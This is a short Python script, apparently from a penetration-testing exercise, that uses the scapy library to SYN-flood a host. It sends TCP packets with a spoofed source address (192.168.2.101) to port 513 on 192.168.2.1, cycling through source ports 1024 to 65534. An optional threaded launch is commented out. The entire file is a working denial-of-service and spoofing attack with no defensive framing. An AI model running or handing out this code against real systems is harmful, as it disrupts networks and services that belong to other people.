from scapy.all import *
import threading
def synFlood(src, tgt):
    for sport in range(1024,65535):
	IPlayer = IP(src=src, dst=tgt)
	TCPlayer = TCP(sport=sport, dport=513)
	pkt = IPlayer / TCPlayer
	send(pkt)
src = "192.168.2.101"
tgt = "192.168.2.1"
synFlood(src,tgt)
#t = Thread(target=synFlood, args=(src, tgt))
#t.start()
